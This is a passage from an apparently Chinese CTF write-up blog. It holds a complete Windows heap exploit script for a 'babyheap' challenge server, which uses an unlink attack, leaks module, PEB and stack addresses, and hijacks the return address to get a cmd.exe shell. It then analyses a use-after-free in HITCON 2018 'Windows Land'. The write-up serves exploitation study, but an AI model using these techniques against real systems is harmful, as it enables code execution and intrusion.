class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process("./babyheap.exe")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>, <span class="number">29639</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">2</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">'1'</span>:</span><br><span class="line">    windbgx.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span><span class="params">(choice)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"What's your choice?"</span>, str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"How long is your sword?"</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">"Well done! Name it!"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Which sword do you want to destroy?"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Which one will you polish?"</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">"And what's the length this time?"</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">"Then name it again : "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choose(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Which one will you check?"</span>, str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Show : "</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shoot</span><span class="params">(addr)</span>:</span></span><br><span class="line">    choose(<span class="number">1337</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"So what's your target?"</span>, str(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pie</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"And here is your Novice village gift : 0x"</span>)</span><br><span class="line">    pie = int(p.recvline()[:<span class="number">-2</span>], <span class="number">16</span>) - <span class="number">0x1090</span></span><br><span class="line">    <span class="keyword">return</span> pie</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ctor_heap_head</span><span class="params">(size, flags, prev_size, remain_size)</span>:</span></span><br><span class="line">    chksum =  ((size &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0xff</span>) ^ ((size &gt;&gt; <span class="number">3</span>) &gt;&gt; <span class="number">8</span>) ^ flags</span><br><span class="line">    val = (size &gt;&gt; <span class="number">3</span>) | (flags &lt;&lt; <span class="number">16</span>) | (chksum &lt;&lt; <span class="number">24</span>) | (prev_size &gt;&gt; <span class="number">3</span> &lt;&lt; <span class="number">32</span>) | (remain_size &lt;&lt; <span class="number">56</span>)</span><br><span class="line">    <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_info</span><span class="params">(chunk_array, addr)</span>:</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x8</span>, p32(chunk_array + <span class="number">4</span>) + p32(addr))</span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    val = u32(p.recvline()[:<span class="number">-2</span>].ljust(<span class="number">4</span>, <span class="string">"\x00"</span>)[:<span class="number">4</span>])</span><br><span class="line">    <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line">PIE = get_pie()</span><br><span class="line">chunk_array = PIE + <span class="number">0x4370</span></span><br><span class="line">chunk_status = PIE + <span class="number">0x43BC</span></span><br><span class="line">puts_iat = PIE + <span class="number">0x30C8</span></span><br><span class="line">heapfree_iat = PIE + <span class="number">0x3004</span></span><br><span class="line">ret_from_main = PIE + <span class="number">0x193b</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create three chunks</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"AAA"</span>) <span class="comment"># chunk 0</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"BBB"</span>) <span class="comment"># chunk 1</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"CCC"</span>) <span class="comment"># chunk 2</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"DDD"</span>) <span class="comment"># chunk 3</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"EEE"</span>) <span class="comment"># chunk 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap head and calculate encoding</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="number">0x68</span>, <span class="string">"B"</span> * <span class="number">0x60</span> + <span class="string">"heaphead"</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"heaphead"</span>)</span><br><span class="line">heap_head = u64(p.recv(<span class="number">6</span>) + <span class="string">'\x00\x08'</span>)</span><br><span class="line">encoding = heap_head ^ ctor_heap_head(<span class="number">0x70</span>, <span class="number">0x01</span>, <span class="number">0x70</span>, <span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak freelist address</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="number">0x76</span>, <span class="string">"B"</span> * <span class="number">0x6E</span> + <span class="string">"freelist"</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"freelist"</span>)</span><br><span class="line">freelist = u32(p.recvline()[:<span class="number">-2</span>].rjust(<span class="number">4</span>, <span class="string">"\x00"</span>)) + <span class="number">0xc0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fix chunk 2 head</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="number">0x70</span>, <span class="string">"B"</span> * <span class="number">0x68</span> + p64(heap_head))</span><br><span class="line"></span><br><span class="line"><span class="comment"># unlink attack</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x78</span>, <span class="string">'A'</span> * <span class="number">0x68</span> + p64(ctor_heap_head(<span class="number">0x70</span>, <span class="number">0x00</span>, <span class="number">0x70</span>, <span class="number">0x00</span>) ^ encoding) + p32(chunk_array) + p32(chunk_array + <span class="number">4</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># now chunk_array[1] points to itself</span></span><br><span class="line"><span class="comment"># leak address</span></span><br><span class="line">shoot(chunk_status + <span class="number">1</span>)</span><br><span class="line">ucrtbase = leak_info(chunk_array, puts_iat) - <span class="number">0x95A30</span> <span class="comment">#0xb48d0</span></span><br><span class="line">system = ucrtbase + <span class="number">0xB8320</span> <span class="comment">#0xec730</span></span><br><span class="line">kernel32 = leak_info(chunk_array, heapfree_iat) - <span class="number">0x13FC0</span> <span class="comment">#0x1df60</span></span><br><span class="line">kernel32_atol = kernel32 + <span class="number">0x81800</span> <span class="comment">#0x81B70</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak ntdll</span></span><br><span class="line">ntdll = leak_info(chunk_array, kernel32_atol) - <span class="number">0x72980</span> <span class="comment">#0x76870</span></span><br><span class="line">ntdll_peb_addr = ntdll + <span class="number">0x10eb84</span> <span class="comment">#0x125d34</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak peb and teb</span></span><br><span class="line">PEB = leak_info(chunk_array, ntdll_peb_addr) - <span class="number">0x44</span></span><br><span class="line">TEB = PEB + <span class="number">0x3000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stack address</span></span><br><span class="line">stack_end = leak_info(chunk_array, TEB + <span class="number">6</span>) &lt;&lt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># find where return address is stored</span></span><br><span class="line">ret_addr_pos = stack_end - <span class="number">4</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> leak_info(chunk_array, ret_addr_pos) == ret_from_main:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ret_addr_pos -= <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hijack ret address</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="number">0x14</span>, p32(chunk_array + <span class="number">4</span>) + p32(ret_addr_pos) + p32(<span class="number">0</span>) + <span class="string">"cmd.exe\x00"</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="number">0x10</span>, p32(system) + p32(<span class="number">0</span>) + p32(chunk_array + <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line">quit()</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[+] PIE base is: "</span> + hex(PIE))</span><br><span class="line">print(<span class="string">"[+] Encoding is: "</span> + hex(encoding))</span><br><span class="line">print(<span class="string">"[+] Freelist address is: "</span> + hex(freelist))</span><br><span class="line">print(<span class="string">"[+] ucrtbase address is: "</span> + hex(ucrtbase))</span><br><span class="line">print(<span class="string">"[+] kernel32 address is: "</span> + hex(kernel32))</span><br><span class="line">print(<span class="string">"[+] ntdll address is: "</span> + hex(ntdll))</span><br><span class="line">print(<span class="string">"[+] PEB address is: "</span> + hex(PEB))</span><br><span class="line">print(<span class="string">"[+] TEB address is: "</span> + hex(TEB))</span><br><span class="line">print(<span class="string">"[+] stack_end address is: "</span> + hex(stack_end))</span><br><span class="line">print(<span class="string">"[+] return address lies on: "</span> + hex(ret_addr_pos))</span><br><span class="line">print(<span class="string">"[+] system address is: "</span> + hex(system))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Windows-HITCON-2018-Windows-Land"><a href="#Windows-HITCON-2018-Windows-Land" class="headerlink" title="[Windows][HITCON 2018]Windows Land"></a>[Windows][HITCON 2018]Windows Land</h1><h2 id="题目分析-6"><a href="#题目分析-6" class="headerlink" title="题目分析"></a>题目分析</h2><p>典型的菜单题，但是比较繁杂，总的来说，就是有五种操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create</span><br><span class="line">list</span><br><span class="line">edit</span><br><span class="line">delete</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>以及五个操作对象：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1) Teacher</span><br><span class="line">2) Engineer</span><br><span class="line">3) Doctor</span><br><span class="line">4) Athlete</span><br><span class="line">5) Pig</span><br></pre></td></tr></table></figure><p>由于是C++程序，仔细分析可以发现，五种对象都是以<code>vector</code>形式存储的，增删通过相应的<code>push_back</code>和<code>erase</code>进行。</p><p>而其中比较与众不同的是<code>Engineer</code>，它的成员里包含一个动态分配的指针，也就是<code>language</code>成员变量：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"What language&gt; "</span>);</span><br><span class="line">v41 = <span class="number">0</span>i64;</span><br><span class="line"><span class="keyword">while</span> ( <span class="built_in">read</span>(<span class="number">0</span>, &amp;DstBuf, <span class="number">1u</span>) &gt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)DstBuf == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *((_BYTE *)info_buf + v41) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *((_BYTE *)info_buf + v41++) = DstBuf;</span><br><span class="line">  <span class="keyword">if</span> ( v41 &gt;= <span class="number">0x100</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">v56 = <span class="number">0</span>i64;</span><br><span class="line">v57 = age;</span><br><span class="line">v55 = name_buf[<span class="number">0</span>];</span><br><span class="line">v58 = <span class="number">0</span>i64;</span><br><span class="line">v59 = (&amp;carrier_array)[carrier_idx];</span><br><span class="line">v60 = salary;</span><br><span class="line"><span class="keyword">if</span> ( LOBYTE(info_buf[<span class="number">0</span>]) )</span><br><span class="line">&#123;</span><br><span class="line">  v0 = (<span class="keyword">unsigned</span> __int64)<span class="built_in">malloc</span>((<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="keyword">unsigned</span> __int8)random_padding + <span class="number">512</span>);</span><br><span class="line">  v58 = v0;</span><br><span class="line">  *(_OWORD *)v0 = info_buf[<span class="number">0</span>];</span><br><span class="line">  *(_DWORD *)(v0 + <span class="number">16</span>) = info_buf[<span class="number">1</span>];</span><br><span class="line">  *(_WORD *)(v0 + <span class="number">20</span>) = WORD2(info_buf[<span class="number">1</span>]);</span><br><span class="line">  v42 = BYTE6(info_buf[<span class="number">1</span>]);</span><br><span class="line">  *(_BYTE *)(v0 + <span class="number">22</span>) = BYTE6(info_buf[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( (<span class="keyword">void</span> *)engineer_array_capacity == *(&amp;engineer_array_start + <span class="number">1</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  sub_7FF6C3CF3740(v42, *(&amp;engineer_array_start + <span class="number">1</span>), &amp;v55);</span><br><span class="line">  v0 = v58;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_7FF6C3CF1130(*(&amp;engineer_array_start + <span class="number">1</span>), &amp;v55);</span><br><span class="line">  *(&amp;engineer_array_start + <span class="number">1</span>) = (<span class="keyword">char</span> *)*(&amp;engineer_array_start + <span class="number">1</span>) + <span class="number">48</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v0 )</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)v0);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>这里先<code>malloc</code>再<code>free</code>的是一个局部变量，在进行<code>push_back</code>中会进行拷贝，也就是会再分配一个同样大小的buffer作为<code>language</code>，并把0x18 bytes的数据复制进去。</p><p>而漏洞存在于：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// edit function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">rsi14 = rsi13 - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (!rsi14)</span><br><span class="line">&#123;</span><br><span class="line">    rdi50 = <span class="number">0</span>i64;</span><br><span class="line">    r10_50 = ((_BYTE *)*(&amp;engineer_array_start + <span class="number">1</span>) - (_BYTE *)engineer_array_start) / <span class="number">48</span>;</span><br><span class="line">    <span class="keyword">if</span> (r10_50)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (r9_51 = <span class="number">0</span>i64;; r9_51 += <span class="number">48</span>i64)</span><br><span class="line">        &#123;</span><br><span class="line">            rax52 = (<span class="keyword">unsigned</span> __int8 *)engineer_array_start + r9_51;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">                ecx53 = rax52[(<span class="keyword">char</span> *)info_buf - ((_BYTE *)engineer_array_start + r9_51)];</span><br><span class="line">                edx53 = *rax52 - ecx53;</span><br><span class="line">                <span class="keyword">if</span> (edx53)</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                ++rax52;</span><br><span class="line">            &#125; <span class="keyword">while</span> (ecx53);</span><br><span class="line">            <span class="keyword">if</span> (!edx53)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">if</span> (++rdi50 &gt;= r10_50)</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"edit failed\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"What language&gt; "</span>);</span><br><span class="line">        <span class="built_in">memset</span>(info_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(info_buf));</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">read</span>(<span class="number">0</span>, DstBuf, <span class="number">1u</span>) &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (DstBuf[<span class="number">0</span>] == <span class="number">10</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                *((_BYTE *)info_buf + rbx1) = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            *((_BYTE *)info_buf + rbx1++) = DstBuf[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">if</span> (rbx1 &gt;= <span class="number">0x100</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        rcx64 = (_DWORD *)*((_QWORD *)engineer_array_start + <span class="number">6</span> * rdi50 + <span class="number">3</span>);</span><br><span class="line">        <span class="keyword">if</span> (LOBYTE(info_buf[<span class="number">0</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (rcx64) <span class="comment">// uaf here</span></span><br><span class="line">            &#123;</span><br><span class="line">                eax66 = info_buf[<span class="number">1</span>];</span><br><span class="line">                *(_OWORD *)rcx64 = info_buf[<span class="number">0</span>];</span><br><span class="line">                rcx64[<span class="number">4</span>] = eax66;</span><br><span class="line">                *((_WORD *)rcx64 + <span class="number">10</span>) = WORD2(info_buf[<span class="number">1</span>]);</span><br><span class="line">                *((_BYTE *)rcx64 + <span class="number">22</span>) = BYTE6(info_buf[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                sub_7FF6C3CF11D0((__int64)engineer_array_start + <span class="number">48</span> * rdi50, (__int64)info_buf);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (rcx64)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">free</span>(rcx64); <span class="comment">// free but not set zero</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"edit succeed\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"edit succeed\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"edit failed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>也就是在<code>edit</code>该<code>Engineer-&gt;language</code>的时候，如果第一个字节为”\x00”，那么就会直接触发<code>free</code>，但是并不会置为0（当然正常地<code>edit</code>也是可以的，但是只能写0x18 bytes到buffer里面）。所以，这里存在UAF可以利用。</p><h2 id="利用思路-6"><a href="#利用思路-6" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>由于windows的heap比较复杂，而且经过不断地调试发现，其布局是不可预测的，所以不太可能像linux下一样通过偏移直接定位到目标chunk；再加上程序刚开始读了一个随机数（0x00 ~ 0xF0），每次对<code>Engineer-&gt;language</code>进行<code>malloc</code>的时候，都会在0x200的基础上加上该随机数，使得heap布局更加无法预测。经过长时间地调试发现，可以通过其他类型的操作对象（如<code>teacher</code>等）先对heap上的碎片进行占位，考虑到<code>vector</code>的增长方式是<code>1、2、3、4、6、9、13、19、28、...</code>（capacity），对应的size为<code>0x30、0x60、0x90、0xc0、0x120、0x1B0、0x270、0x390、0x540、...</code>，因此将相应的几个<code>vector</code>占到0x270 bytes大小的chunk，之后对<code>Engineer</code>进行操作的时候，heap布局就会稍微稳定一些： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0000021d873d7110 0028 0013  [00]   0000021d873d7120    00270 - (busy) &#x3D;&#x3D;&gt; vector doctor </span><br><span class="line">0000021d873d7390 0028 0028  [00]   0000021d873d73a0    00270 - (busy) &#x3D;&#x3D;&gt; vector athlete</span><br><span class="line">0000021d873d7610 0028 0028  [00]   0000021d873d7620    00270 - (free) &#x3D;&#x3D;&gt; vector engineer (old old)</span><br><span class="line">0000021d873d7890 0028 0028  [00]   0000021d873d78a0    00270 - (busy) &#x3D;&#x3D;&gt; vector teacher</span><br><span class="line">0000021d873d7b10 003a 0028  [00]   0000021d873d7b20    00390 - (free) &#x3D;&#x3D;&gt; vector engineer (old)</span><br><span class="line">0000021d873d7eb0 0055 003a  [00]   0000021d873d7ec0    00540 - (busy) &#x3D;&#x3D;&gt; vector engineer </span><br><span class="line">0000021d873d8400 00bc 0055  [00]   0000021d873d8410    00bb0 - (free)</span><br></pre></td></tr></table></figure>在<code>0x0000021d873d7ec0</code>这个chunk还没有拿到的时候是一个大的<code>freed</code>状态的块，其<code>Blink</code>指向的是<code>0x0000021d873d7620</code>。</li><li>同时发现，<code>Engineer-&gt;name</code>是没有自动在结尾补”\x00”的，再加上其位置为chunk的Flink所在位置，紧挨着Blink，而且进行拷贝构造的时候，Blink也会拷贝到这个<code>vector</code>中，所以可以通过<code>Engineer-&gt;name</code>来对heap进行一个leak，从而找到目标<code>Engineer</code>的<code>vector</code>的准确位置（也就是leak出来的<code>Blink + 0x280 + 0x280 + 0x3a0 = Blink + 0x8a0</code>）。</li><li>由于<code>vector Engineer</code>的size达到0x540的时候，其成员个数在<code>20 ~ 28</code>变化不会改变<code>vector</code>的大小，所以可以利用这几个成员对<code>Engineer-&gt;language</code>进行操作，比如这里我们申请出7个<code>language</code>的buffer进行后续利用（实际上用不上这么多）： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">000001fbc7797fa0 0028 0028  [00]   000001fbc7797fb0    00270 - (free)</span><br><span class="line">000001fbc7798220 0028 0028  [00]   000001fbc7798230    00270 - (busy)</span><br><span class="line">000001fbc77984a0 003a 0028  [00]   000001fbc77984b0    00390 - (free) </span><br><span class="line">000001fbc7798840 0055 003a  [00]   000001fbc7798850    00540 - (busy) &#x3D;&#x3D;&gt; vector engineer</span><br><span class="line">000001fbc7798d90 002c 0055  [00]   000001fbc7798da0    002b0 - (busy) &#x3D;&#x3D;&gt; language[20]</span><br><span class="line">000001fbc7799050 002c 002c  [00]   000001fbc7799060    002b0 - (busy) &#x3D;&#x3D;&gt; language[21]</span><br><span class="line">000001fbc7799310 002c 002c  [00]   000001fbc7799320    002b0 - (free) &#x3D;&#x3D;&gt; language[22] </span><br><span class="line">000001fbc77995d0 002c 002c  [00]   000001fbc77995e0    002b0 - (busy) &#x3D;&#x3D;&gt; language[23]</span><br><span class="line">000001fbc7799890 002c 002c  [00]   000001fbc77998a0    002b0 - (free) &#x3D;&#x3D;&gt; language[24]</span><br><span class="line">000001fbc7799b50 002c 002c  [00]   000001fbc7799b60    002b0 - (busy) &#x3D;&#x3D;&gt; language[25]</span><br><span class="line">000001fbc7799e10 002c 002c  [00]   000001fbc7799e20    002b0 - (busy) &#x3D;&#x3D;&gt; language[26]</span><br><span class="line">000001fbc779a0d0 00ef 002c  [00]   000001fbc779a0e0    00ee0 - (free) </span><br><span class="line">000001fbc779afc0 0004 00ef  [00]   000001fbc779afd0    00030 - (busy)</span><br></pre></td></tr></table></figure> 这里显示的是依次<code>free(language[22]); 